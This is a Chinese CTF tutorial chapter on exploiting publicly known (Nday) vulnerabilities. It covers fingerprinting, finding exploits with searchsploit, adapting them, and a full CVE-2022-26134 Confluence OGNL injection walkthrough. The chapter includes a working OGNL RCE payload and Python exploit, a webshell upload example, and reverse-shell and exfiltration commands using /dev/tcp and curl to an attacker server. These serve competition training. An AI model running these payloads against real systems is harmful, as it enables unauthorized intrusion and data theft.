---
comments: true
---

# Nday利用

前面的章节讲的都是"漏洞类型"：SQL 注入、文件上传、反序列化……这些题目的漏洞点是出题人亲手埋进自己写的代码里的。但比赛中还有一大类题，套路完全不同：网站跑的是一个 **真实的、公开披露过漏洞的组件**，比如某个版本的 Confluence、ThinkPHP、Fastjson。漏洞早就被公开了，EXP（Exploit，利用代码）在网上随便就能搜到，你要做的只是"找到它、改一改、打过去"。

这类题就是 **Nday 题**。本章讲怎么又快又稳地拿下它。

## 什么是 Nday 题

先理清几个经常混用的词：

- **0day**：漏洞还没有公开、没有补丁，只有发现者（或少数人）知道。CTF 里基本不会出现真正的 0day 题，那是真实攻防的事。
- **1day**：漏洞刚公开不久，可能还没有官方补丁，但漏洞细节和 PoC（Proof of Concept，概念验证代码）已经流出。
- **Nday**：漏洞公开已久，补丁有了，分析报告、EXP 满大街都是——只是目标还在用没打补丁的老版本。

Nday 题的本质是 **信息检索 + 复现能力** 的考试，而不是漏洞挖掘能力的考试。出题人把一个存在已知漏洞的组件装进 Docker，你要做的是：

1. 认出"这是什么组件、什么版本"；
2. 找到对应的公开 EXP；
3. 把 EXP 改到能在题目环境里跑通。

### 为什么 Nday 题越来越常见

- **出题成本低、环境真实**：出题人用 Docker 一键拉起一个真实漏洞环境，比自己写一个有漏洞的 Web 应用省力得多，而且更贴近实战。
- **实战导向**：真实的渗透测试和攻防演练里，绝大多数突破口就是 Nday——攻击者扫到你的服务版本，查一下漏洞库，直接打。比赛越来越强调"学了就能用"。
- **考查点明确**：能不能快速识别指纹、能不能读懂别人写的 EXP、能不能根据环境差异排错——这些是安全工程师的基本功。

所以对选手来说，Nday 题是 **性价比最高的题**：不需要你挖漏洞，只需要你流程熟练。下面就把这条流程拆透。

## 赛中快速复现流程

完整流程就五步，记熟它：

```text
识别指纹 → 找 EXP → 读懂 EXP → 按题目环境改写 → 利用
```

### 第一步：识别指纹

拿到一个 Web 题，先回答两个问题：**这是什么组件？什么版本？** 常用手段：

- **看响应头和页面特征**：`Server`、`X-Powered-By` 头，页面底部的版权信息，登录页的标题和 logo。例如 `Set-Cookie: JSESSIONID` 提示是 Java 系，`X-Generator: confluence` 直接自报家门。
- **报错信息**：故意触发 404、传畸形参数，报错页往往会泄露框架名和版本（ThinkPHP 的经典报错页、Java 的 stack trace）。
- **目录扫描**：用 dirsearch、ffuf 扫一遍，发现 `/actuator`（Spring Boot）、`/phpinfo.php`、`/console`（WebLogic）这类特征路径，往往直接锁定组件。
- **Wappalyzer / 浏览器插件**：一键识别前端库、框架、服务器。
- **题目描述和附件**：CTF 里别忘了读题面！题目名、描述里的版本号、附带的 Dockerfile 或源码，都是最直接的指纹。如果附件里有 `Dockerfile`，里面的 `FROM confluence:7.13.6` 就是标准答案。

这部分的通用方法和「敏感信息泄露」一章里的思路是相通的，可以交叉阅读。

### 第二步：找 EXP

锁定"组件 + 版本"后，去这几个地方找公开利用代码：

- **searchsploit**：Exploit-DB 的命令行离线版，kali 自带，速度最快：

```bash
# 先更新本地漏洞库
searchsploit -u

# 按关键字搜索
searchsploit confluence
searchsploit thinkphp 5.0
```

搜到后用 `searchsploit -m 50513` 把 EXP 复制到当前目录（50513 是 EDB 编号）。

- **GitHub**：直接搜 `CVE编号`、`组件名 + exploit`、`组件名 + RCE`。优先看 star 多、最近有更新的仓库；`CVE-2022-26134` 这种搜 CVE 号最精准。
- **漏洞库网站**：Exploit-DB、Seebug、Vulhub（漏洞环境 + 复现说明，非常适合学习）。

> 注意：如果不知道 CVE 编号，先用"组件 + 版本 + 漏洞"搜出对应的 CVE 号，再用 CVE 号搜 EXP，命中率会高很多。

### 第三步：读懂 EXP

**不要拿到 EXP 就直接跑。** 至少要读明白三件事：

1. **它往哪发什么请求**？目标 URL、路径、参数、请求方法、必要的 Header 是什么？
2. **漏洞触发点在哪**？哪个参数是注入点，payload 的结构长什么样？
3. **它执行什么命令、结果怎么回来**？是直接把命令结果回显在响应里，还是写 webshell，还是反弹 shell？命令是硬编码的还是从命令行参数读的？

读懂这三点，改写就是水到渠成的事；读不懂就盲跑，轻则打不通，重则在真实场景里搞坏目标。对 CTF 初学者来说，"读懂 EXP"这一步同时也是最好的学习机会——每个 EXP 都是一份浓缩的漏洞分析。

### 第四步：按题目环境改写

这是 Nday 题真正拉开差距的一步。公开 EXP 默认的环境和题目环境几乎总有差异，常见改动点下一节专门讲。

### 第五步：利用

跑通 EXP，拿到 shell 或命令执行后，读 flag。CTF 里 flag 的常见位置：

```bash
cat /flag
cat /flag.txt
ls /           # 有的题目 flag 文件名带随机后缀，先 ls 看一眼
env            # 有的题目把 flag 放在环境变量里
```

### 一条完整流程示例

假设比赛给了 `http://target:8080/`，页面上是个后台登录框，底部写着 "Powered by xxxCMS"。

```bash
# 1. 识别指纹：看响应头 + 扫目录，确认是 xxxCMS 2.3
curl -I http://target:8080/

# 2. 找 EXP
searchsploit xxxCMS
#  xxxCMS 2.3 - Remote Code Execution  | php/webapps/50123.py

# 3. 复制出来读代码
searchsploit -m php/webapps/50123.py
cat 50123.py        # 读：它向 /admin/upload.php POST 一个 PHP shell

# 4. 改写：把 EXP 里的 http://victim.com 换成题目地址，
#    把默认后台路径 /admin/ 改成题目实际的 /backend/

# 5. 利用
python3 50123.py
# 拿到 webshell 地址后：
curl http://target:8080/uploads/shell.php?cmd=cat+/flag
```

整个流程熟练后就是几分钟的事。慢的地方通常不在"找"，而在"改"——所以下一节专门讲改写。

## EXP 改写要点

公开 EXP 和题目环境之间的差异，基本逃不出这四类。

### 目标 URL 与路径

最基础的改写。EXP 里的 `TARGET = "http://localhost:8080"` 要换成题目给的地址。注意几个坑：

- **路径前缀**：题目可能把应用挂在子路径下（如 `http://target:8080/cms/`），EXP 里硬编码的 `/admin/upload.php` 就要改成 `/cms/admin/upload.php`。
- **端口映射**：容器环境里 Dockerfile 内部是 80 端口，映射出来可能是 8080，以题目给你的地址为准。
- **路径差异**：同一个组件在不同发行版里路径可能不同（比如 EXP 按 Windows 安装包写的路径，题目是 Linux 容器）。

### 回连地址：反弹 shell 与外带

如果 EXP 是反弹 shell 型的（通过 `bash -i >& /dev/tcp/...` 或类似 payload 让目标主动连回来），你要填自己的 IP 和端口。比赛里分两种情况：

- **题目环境与你同一内网**（线下赛常见）：直接填自己的内网 IP，本地 `nc -lvnp 4444` 监听即可。
- **远程线上赛**：你的机器在 NAT 后面，目标连不回来。这时用内网穿透工具（如 frp、ngrok）把本地端口暴露出去，EXP 里填穿透后的公网地址和端口。

如果反弹 shell 走不通，还有一条退路：**外带（带外）数据**。让目标把命令结果通过 HTTP/DNS 发出来：

```bash
# 让目标把 flag 带回你的接收端（可用 Burp Collaborator、dnslog、或自己起的 HTTP 服务）
curl http://your-server/`cat /flag | base64`
```

### 命令与 payload 适配

- **操作系统差异**：EXP 按 Linux 写的 payload 里有 `bash`、`curl`，如果题目是 Windows 容器就要换成 `cmd /c`、PowerShell；反之亦然。先看 Dockerfile 或报错信息判断目标系统。
- **命令不存在**：极简容器里常常没有 `curl`、`wget`、`nc`。试试 `python3 -c`、`perl`、`php -r`，或者干脆用反弹 shell 的 `/dev/tcp` 写法（bash 内置，不依赖外部命令）。
- **命令结果回显方式**：有的 EXP 把结果写进响应包，有的写到文件再访问。按题目实际能回显的方式调整，比如在「RCE」一章学过的各种无回显外带技巧。

### 绕过题目环境限制

出题人有时会在真实漏洞上 **加一点小障碍**，防止你拿公开 EXP 一把梭：

- **WAF / 关键字过滤**：过滤了 `cat`、`flag` 等关键字。用「RCE」和「PHP特性与常见绕过」章的技巧绕过：`ca\t /fla?`、变量拼接、`base64 -d` 解码执行。
- **请求被改包**：题目前面架了反向代理，只放行特定路径或特定 Header。在 EXP 里补上对应的 Header（如 `X-Forwarded-For`、特定的 `Referer`）。
- **超时限制**：sleep 型盲注/盲打 payload 被超时掐断，换成 DNS 外带。

一句话总结：**EXP 是模板，不是答案**。会改 EXP 的人打 Nday 题是秒杀，不会改的人只能碰运气。

## 配合 Docker 本地复现加速

比赛中最浪费时间的事：EXP 打不通，但你不知道是自己改错了，还是 EXP 本身就不适用于这个版本。解法很直接——**本地先把漏洞环境拉起来，本地打通了再去打远程**。

这正是「Docker与漏洞环境」一章讲的技能的用武之地。流程：

```bash
# 1. 题目给了 Dockerfile / docker-compose.yml 附件时，直接本地起
docker compose up -d

# 2. 没有附件时，去 Vulhub 找同版本环境
git clone https://github.com/vulhub/vulhub.git
cd vulhub/confluence/CVE-2022-26134
docker compose up -d

# 3. 本地验证 EXP 改对了没有
python3 exp.py http://127.0.0.1:8090

# 4. 本地通了，再指向远程题目
python3 exp.py http://target:8080
```

本地复现的好处：

- **可以随便折腾**：本地环境里你可以进容器看日志、看文件、改代码调试，远程题做不到。
- **版本对齐**：本地跑通了但远程不通，说明两边版本/配置有差异，排查方向立刻明确。
- **赛后可复盘**：比赛结束远程环境关了，本地环境还在，方便写 writeup、补笔记。

## 平时如何积累

Nday 题比的是熟练度，熟练度来自平时。三件事值得坚持做。

### 关注漏洞情报源

- **CVE 与漏洞库**：Exploit-DB、Seebug、NVD，定期翻翻新出的高危 Web 漏洞。
- **Vulhub 更新**：Vulhub 仓库每收录一个新环境，基本就意味着这个漏洞够经典、够适合出题——它本身就是一份"Nday 题预测清单"。
- **安全社区与公众号**：漏洞通告、分析文章出来时，重点看"影响版本 + 触发点 + PoC"，不用一开始就吃透每一行原理。

### 建自己的本地靶场库

- 把做过的 Nday 题按 `组件/CVE编号` 归档，每个目录里存三样东西：能跑的 docker 环境（或 Vulhub 链接）、你改好的 EXP、一份简短的复现笔记（指纹特征 + 触发点 + 坑）。
- 赛后复盘时把没做出来的题补进去。半年之后这个库就是你比赛时的私人武器库，比现搜快得多。
- 平时练手可以结合「Web入门题单」里的节奏，把 Nday 复现和手工漏洞练习穿插着做。

### 读懂比会用更重要

每复现一个漏洞，多问一句"这个漏洞的根因是什么"——是 OGNL 注入？是反序列化？是路径穿越？把 Nday 归到本书前面学过的漏洞类型里去，你会发现新出的漏洞大多都是"旧原理 + 新场景"，学习成本越来越低。

## 完整推演示例：CVE-2022-26134（Confluence OGNL 注入 RCE）

最后用一道非常典型的 CTF Nday 题，把本章流程完整走一遍。CVE-2022-26134 是 Atlassian Confluence 的 OGNL 表达式注入漏洞，影响多个版本，未授权即可远程命令执行，是近几年比赛里的常客。

### 1. 识别指纹

访问题目地址，是一个 Confluence  wiki 页面。识别手段：

- 响应头或 HTML 里有 `confluence` 字样，路径形如 `/login.action`（`.action` 后缀是 Struts2 框架的典型特征）；
- 报错页或 `/login.action?error=` 里可能直接显示版本号；
- 题目附件的 Dockerfile 写着 `FROM atlassian/confluence-server:7.13.x`。

版本在受影响范围内，锁定 CVE-2022-26134。

### 2. 找 EXP

```bash
searchsploit confluence 2022
# 或直接 GitHub 搜 CVE-2022-26134
```

### 3. 读懂 EXP

这个漏洞的 PoC 非常短，核心就是一个请求。漏洞触发点在 URL 路径里：把 OGNL 表达式 URL 编码后放进 `${...}`，拼进路径，Confluence 处理时会把它当表达式求值。PoC 长这样：

```http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D/ HTTP/1.1
Host: target:8090
```

解码后路径里的表达式是：

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8"))}
```

读明白了：

- **请求**：GET，注入点就在路径里，`${...}` 整体做了 URL 编码；
- **触发逻辑**：`Runtime.getRuntime().exec("id")` 执行命令，`IOUtils.toString(...)` 把输出读成字符串；
- **回显方式**：表达式的求值结果会出现在响应里——有的版本回显在响应体，有的回显在 `X-Cmd-Response` 响应头里。

典型的 EXP（Python）就是构造这个 URL 再解析响应：

```python
import sys, urllib.parse, requests

url = sys.argv[1]            # 目标地址
cmd = sys.argv[2]            # 要执行的命令

ognl = '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("%s").getInputStream(),"utf-8"))}' % cmd
payload = urllib.parse.quote(ognl, safe='')   # 整体 URL 编码

r = requests.get(f"{url}/{payload}/", allow_redirects=False, timeout=10)
# 部分版本结果在响应头里
print(r.headers.get("X-Cmd-Response", r.text[:500]))
```

### 4. 按题目环境改写

假设目标是 `http://target:8080`，直接跑：

```bash
python3 exp.py http://target:8080 id
```

常见改写情况：

- 不通，先看状态码：302 跳转说明路径前缀不对，把题目实际的访问前缀补上；
- 响应头里没有 `X-Cmd-Response`，说明该版本结果在响应体里，改解析逻辑，从 body 里提取；
- 题目有 WAF 过滤了 `Runtime` 关键字：换用其他 OGNL payload，或对关键字做编码变形；
- 极简容器没有 `curl`，想外带 flag 就改用 `/dev/tcp`：

```bash
python3 exp.py http://target:8080 "bash -c 'cat /flag > /dev/tcp/你的IP/4444'"
```

### 5. 拿到 flag

```bash
python3 exp.py http://target:8080 "cat /flag"
# flag{ognl_1nj3ct10n_1s_fun}
```

### 6. 复盘归档

赛后把这个漏洞归入自己的靶场库：漏洞根因是 **OGNL 表达式注入**（和「SSTI注入」一章的模板注入是同族思路——用户输入被当成了某种表达式语言去求值），指纹特征是 `.action` 路径 + Confluence 版本号，EXP 改写要点是 URL 编码和回显位置。下次再遇到 OGNL 类漏洞（比如某些 Struts2 历史 CVE），就是秒题。

## 小结

Nday 题考的不是挖漏洞，而是流程：**识别指纹 → 找 EXP → 读懂 → 改写 → 利用**。把这条流程练熟，配上 Docker 本地复现和平时积累的靶场库，Nday 题就是你在比赛里最稳定的得分来源。
